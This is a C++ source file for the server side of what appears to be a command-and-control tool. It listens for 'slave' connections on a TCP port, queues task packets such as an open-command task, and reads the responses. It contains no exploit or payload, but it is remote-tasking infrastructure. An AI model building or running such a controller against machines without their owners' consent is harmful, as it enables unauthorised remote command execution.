/*
Copyright (C) 2023 Matan Shitrit (0xMegaByte)

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/
#include "MasterDispatcher.h"

DWORD WINAPI ProcessSlave(LPVOID lpv)
{
	DEBUG_PRINT("Thread running...\n");
	//SlaveConnection* pSlaveConnection = new SlaveConnection(*static_cast<SlaveConnection*>(lpv));
	SlaveConnection* pSlaveConnection = static_cast<SlaveConnection*>(lpv);

	bool bPacketSent = false;

	if (pSlaveConnection)
	{
		//Monitor connections options
		//Use keep alive packets
		//Or "query the socket state"
		//If disconnected, kill the thread and clean

		DEBUG_PRINT("Connection's details converted\n");
		unsigned long ulSlaveId = pSlaveConnection->GetConnectionId();

		bool bStart = pSlaveConnection->GetStartFlag();

		if (MSFPacketQueue* pPacketQueue = pSlaveConnection->GetMSFPacketQueue())
		{
			if (std::mutex* pLock = pSlaveConnection->GetMSFPacketQueueLock())
			{
				SOCKET SlaveSocket = pSlaveConnection->GetSocket();

				if (SlaveSocket)
				{
					int nbytesSent;
					int nbytesRecv = SOCKET_ERROR;
					char sendBuf[MSFPACKET_SIZE]{ 0 };
					char recvBuf[MSFPACKET_SIZE]{ 0 };

					bool bPacketSent = false;

#pragma region One-time ACK packet

					if (!pPacketQueue->empty())
					{
						pLock->lock();
						{
							MSFPacket* pAckPacket = pPacketQueue->front();

							if (pAckPacket)
							{
								//check if Ack type
								if (pAckPacket->getPacketType() == EPACKET::PacketType::Acknowledge)
								{
									DEBUG_PRINT("Sending ACK Packet to slave\n");

									pAckPacket->PrintPacket();

									char cAckPacketBuffer[MSFPACKET_SIZE]{ 0 };
									memcpy_s(cAckPacketBuffer, MSFPACKET_SIZE, pAckPacket, MSFPACKET_SIZE);

									nbytesSent = send(SlaveSocket, cAckPacketBuffer, MSFPACKET_SIZE, 0);
									if (nbytesSent == SOCKET_ERROR)
									{
										DWORD dwWSA_ERR = WSA_ERR;
										DEBUG_PRINT("Failed to send packet! [WSA:%d]\n", dwWSA_ERR);
										if (dwWSA_ERR == WSAECONNRESET)
										{
											DEBUG_PRINT("Client %lu disconnected!\n", ulSlaveId);
										}

										bStart = false;
									}
									else
									{
										DEBUG_PRINT("Master sent ACK to Slave(%lu)\n", ulSlaveId);
										bPacketSent = true;
									}
								}

								//pop it from queue
								pPacketQueue->pop_front();

								//delete it from mem
								DELETE_PTR(pAckPacket);
							}
						}
						pLock->unlock();
					}
#pragma endregion

					while (bStart)
					{
						//Handle Packet Queue send commands
						if (!pPacketQueue->empty())
						{
							pLock->lock();
							{
								MSFPacket* pPacket = pPacketQueue->front();
								if (pPacket)
								{
									char cPacketBuffer[MSFPACKET_SIZE]{ 0 };
									memcpy_s(cPacketBuffer, MSFPACKET_SIZE, pPacket, MSFPACKET_SIZE);

									nbytesSent = send(SlaveSocket, cPacketBuffer, MSFPACKET_SIZE, 0);
									if (nbytesSent == SOCKET_ERROR)
									{
										DWORD dwWSA_ERR = WSA_ERR;
										DEBUG_PRINT("Failed to send packet! [WSA:%d]\n", dwWSA_ERR);
										if (dwWSA_ERR == WSAECONNRESET)
										{
											DEBUG_PRINT("Client %lu disconnected!\n", ulSlaveId);
										}

										bStart = bPacketSent = false;
									}
									else
									{
										bPacketSent = true;
									}
								}

								pPacketQueue->pop_front();
								DELETE_PTR(pPacket);
							}
							pLock->unlock();
						}

						if (bPacketSent)
						{
							DEBUG_PRINT("Waiting for slave reponse..\n");

							//Handle Recv after sending | Waiting for the master to send new packet; and the slave to respond
							nbytesRecv = recv(SlaveSocket, recvBuf, MSFPACKET_SIZE, 0);
							if (nbytesRecv > 0)
							{
								DEBUG_PRINT("Bytes received: %d\n", nbytesRecv);

								MSFPacket* pPacket = (MSFPacket*)recvBuf;
								if (pPacket)
								{
									pPacket->PrintPacket();

									//switch
								}

								//Handle recived bytes as MSFpacket
								//Report to DB packets response using the MSFpacket data
							}
							else if (nbytesRecv == 0)
							{
								DEBUG_PRINT("Connection with slave(%lu) closing...\n", ulSlaveId);
								bPacketSent = bStart = false;
							}
							else
							{
								//fail
								DEBUG_PRINT("Recv() failed. [WSA:%d]\n", WSA_ERR);
								bPacketSent = bStart = false;
							}
						}
					}
				}
			}
		}
	}

	if (pSlaveConnection)
		pSlaveConnection->SetThreadFinishedFlag(true);

	DEBUG_PRINT("Existing Thread...\n");
	//TODO: Handle graceful connection shutdown outside the thread
	return 0;
}

DWORD WINAPI MasterDispatcher::AcceptConnections(LPVOID lpv)
{
	DEBUG_PRINT_CLS("Entered Thread...\n");

	if (WaitForSingleObject(this->m_hDispatcherEvent, INFINITE) == WAIT_OBJECT_0)
	{
		DEBUG_PRINT_CLS("Thread Running!\n");
		if (this->m_bWSA)
		{
			SOCKET& master_socket = this->m_socket;
			SOCKET tempSocket = INVALID_SOCKET;

			while (this->m_bStart)
			{
				//Run until connection accepted
				DEBUG_PRINT_CLS("Ready to accept incoming sockets..\n");
				do
				{
					tempSocket = accept(master_socket, 0, 0);

				} while (tempSocket == INVALID_SOCKET);

				//Connection accepted
				DEBUG_PRINT_CLS("Master socket accepted slave socket successfully.\n");

				this->IncrementTotalSlaveCount(); //Starts with 0

				unsigned long ulSlaveId = this->GetTotalSlaveCount();

				//Issue new connection info
				SlaveConnection* pNewSlaveConnection = new SlaveConnection(
					ulSlaveId,		//Assign Slave (Connection) Id
					tempSocket,		//dedicated slave socket
					this->m_bStart
				);

				if (pNewSlaveConnection)
				{
					HANDLE hNewConnection = INVALID_HANDLE_VALUE;

					//Create suspended thread to able to push ACK packet
					hNewConnection = CreateThread(0, 0, ProcessSlave, pNewSlaveConnection, CREATE_SUSPENDED, 0);

					if (hNewConnection)
					{
						DEBUG_PRINT_CLS("New 'ProcessSlave' thread created\n");

#ifdef STORE_SLAVES_THREAD_HANDLE
						this->AddSlaveThreadHandle(ulSlaveId, hNewConnection);
						DEBUG_PRINT_CLS("Registered new thread handle\n");
#endif
						this->AddConnection(ulSlaveId, pNewSlaveConnection);
						DEBUG_PRINT_CLS("Registered new connection object\n");

						//Create ACK packet and push it to slave's MSFPacketQueue
						MSFPacket* pAckPacket = new MSFPacket(
							EPACKET::PacketType::Acknowledge,
							ulSlaveId,
							EPACKET::CMD::MASTER_SLAVE_ACK_CONNECTION,
							(unsigned char*)"");

						if (pAckPacket)
						{
							if (std::mutex* pPacketQueueLock = pNewSlaveConnection->GetMSFPacketQueueLock())
							{
								if (MSFPacketQueue* pPacketQueue = pNewSlaveConnection->GetMSFPacketQueue())
								{
									pPacketQueueLock->lock();
									{

										pPacketQueue->push_back(pAckPacket);
										DEBUG_PRINT_CLS("Added ACK packet to slave's packet queue\n");

										//Add here packets of your choice to execute upon startup

										////TODO: Test another response for 2nd packet
										MSFPacket* pTestPacket = new MSFPacket(
											EPACKET::PacketType::TaskPacket,
											ulSlaveId,
											EPACKET::CMD::TASK_OPEN_CMD,
											(unsigned char*)"Zbabirat");

										pPacketQueue->push_back(pTestPacket);
										DEBUG_PRINT_CLS("Pushed test packet\n");

									}
									pPacketQueueLock->unlock();
								}
							}
						}

						//Resume Thread after pushing ACK packet
						ResumeThread(hNewConnection);
					}
				}

				tempSocket = INVALID_SOCKET;
				pNewSlaveConnection = nullptr;
			}
		}
	}

	DEBUG_PRINT_CLS("Existing Thread...\n");
	return 0;
}

DWORD WINAPI MasterDispatcher::MonitorConnections(LPVOID lpv)
{
	DEBUG_PRINT_CLS("Entered Thread...\n");

	if (WaitForSingleObject(this->m_hDispatcherEvent, INFINITE) == WAIT_OBJECT_0)
	{
		DEBUG_PRINT_CLS("Thread Running!\n");
		std::unordered_map<SLAVE_ID, SlaveConnection*>& umConnections = this->m_umConnections;

		while (this->m_bStart)
		{
			this->m_ConnectionsLock.lock();
			{
				DEBUG_PRINT_CLS("Monitoring connections...\n");
				if (!umConnections.empty())
				{
					for (std::unordered_map<SLAVE_ID, SlaveConnection*>::iterator itor = umConnections.begin();
						itor != umConnections.end();)
					{
						SlaveConnection* pSlaveConnection = (*itor).second;

						if (pSlaveConnection)
						{
							if (pSlaveConnection->GetThreadFinishedFlag())
							{
								DEBUG_PRINT_CLS("Clearing SlaveConnection [%lu]\n", pSlaveConnection->GetConnectionId());

								DELETE_PTR(pSlaveConnection); //Calls SlaveConnection dtor

								itor = umConnections.erase(itor); //removed connection from Connections' vector
							}
							else
							{
								itor++;
							}
						}
					}
				}
				DEBUG_PRINT_CLS("Finished monitoring connections!\n");
			}
			this->m_ConnectionsLock.unlock();
			Sleep(10000); //10 Seconds
		}
	}

	DEBUG_PRINT_CLS("Existing Thread...\n");
	return 0;
}

void MasterDispatcher::AddConnection(SLAVE_ID ulSlaveId, SlaveConnection* pSlaveConnection)
{
	this->m_ConnectionsLock.lock();
	this->m_umConnections.insert({ ulSlaveId, pSlaveConnection });
	this->m_ConnectionsLock.unlock();
}

#ifdef STORE_SLAVES_THREAD_HANDLE
void MasterDispatcher::AddSlaveThreadHandle(unsigned long ulSlaveId, void* hSlaveThread)
{
	this->m_SlaveThreadHandlesLock.lock();
	this->m_umSlaveThreadHandles.insert({ ulSlaveId,hSlaveThread });
	this->m_SlaveThreadHandlesLock.unlock();
}
#endif

void MasterDispatcher::IncrementTotalSlaveCount()
{
	this->m_SlaveCountLock.lock();
	++this->m_ulTotalSlavesCount;
	this->m_SlaveCountLock.unlock();

}

void MasterDispatcher::DecrementTotalSlaveCount()
{
	this->m_SlaveCountLock.lock();
	--this->m_ulTotalSlavesCount;
	this->m_SlaveCountLock.unlock();
}

unsigned long MasterDispatcher::GetTotalSlaveCount()
{
	return this->m_ulTotalSlavesCount;
}

DWORD WINAPI MonitorConnectionThreadWrapper(LPVOID lpv)
{
	if (lpv)
	{
		MasterDispatcher* pMasterDispatcher = static_cast<MasterDispatcher*>(lpv);
		if (pMasterDispatcher)
		{
			pMasterDispatcher->MonitorConnections(nullptr);
		}
	}

	return 0;
}

DWORD WINAPI AcceptConnectionThreadWrapper(LPVOID lpv)
{
	if (lpv)
	{
		MasterDispatcher* pMasterDispatcher = static_cast<MasterDispatcher*>(lpv);
		if (pMasterDispatcher)
		{
			pMasterDispatcher->AcceptConnections(nullptr);
		}
	}

	return 0;
}

MasterDispatcher::MasterDispatcher() : PacketDispatcher(), m_ulTotalSlavesCount(0), m_hMonitorConnections(INVALID_HANDLE_VALUE),
m_hAcceptConnections(INVALID_HANDLE_VALUE)
{
	if (this->m_hMonitorConnections == INVALID_HANDLE_VALUE)
	{
		this->m_hMonitorConnections = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)MonitorConnectionThreadWrapper, this, 0, 0);
		DEBUG_PRINT_CLS("Monitor Connection thread created (Handle @0x%p)\n", this->m_hMonitorConnections);
	}
	if (this->m_hAcceptConnections == INVALID_HANDLE_VALUE)
	{
		this->m_hAcceptConnections = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)AcceptConnectionThreadWrapper, this, 0, 0);
		DEBUG_PRINT_CLS("Accept Connection thread created (Handle @0x%p)\n", this->m_hAcceptConnections);
	}
}

void MasterDispatcher::SocketSetup(const char* pcIpAddress, const unsigned short usPort)
{
	if (this->m_bWSA)
	{
		addrinfo hints;

		ZeroMemory(&hints, sizeof(addrinfo));

		hints.ai_family = AF_INET;
		hints.ai_socktype = SOCK_STREAM;
		hints.ai_protocol = IPPROTO_TCP;
		hints.ai_flags = AI_PASSIVE;

		if (int res = getaddrinfo(NULL, "6969", &hints, &this->m_pservice) != 0)
		{
			DEBUG_PRINT("ERROR: gettaddrinfo code: %d | WSA: %d\n", res, WSA_ERR);
			this->SocketWSACleanup();
		}

		//Create socket
		if (this->m_pservice)
		{
			addrinfo& service = *this->m_pservice;

			// Create a SOCKET for the server to listen for client connections
			this->m_socket = socket(service.ai_family, service.ai_socktype, service.ai_protocol);

			if (this->m_socket == INVALID_SOCKET)
			{
				DEBUG_PRINT("Error at socket(): %ld\n", WSA_ERR);
				this->SocketWSACleanup();
				//TODO: Remember to free addrinfo using (freeaddrinfo(m_service))
			}

			if (this->m_socket)
			{
				DEBUG_PRINT("Socket initialized\n");

				addrinfo*& service = this->m_pservice;

#pragma region bind

				int nRes = bind(this->m_socket, service->ai_addr, (int)service->ai_addrlen);

				if (nRes == SOCKET_ERROR)
				{
					//fail
					DEBUG_PRINT("bind() failed! [WSA:%d]\n", WSA_ERR);
					closesocket(this->m_socket);
					this->m_socket = INVALID_SOCKET;
					this->SocketWSACleanup();
				}

				DEBUG_PRINT("Master socket bind() successfully.\n");
#pragma endregion
#pragma region listen

				//Start listen on the address-port for incoming connections

				nRes = listen(this->m_socket, SOMAXCONN);

				if (nRes == SOCKET_ERROR)
				{
					//fail
					DEBUG_PRINT("listen() failed! WSA:%ld\n", WSA_ERR);
					closesocket(this->m_socket);
					this->m_socket = INVALID_SOCKET;
					this->SocketWSACleanup();

				}

				DEBUG_PRINT("Master socket listen() successfully.\n");

#pragma endregion
			}
		}
	}
	else
	{
		DEBUG_PRINT("ERROR: WSA was not initiated!\n");
	}
}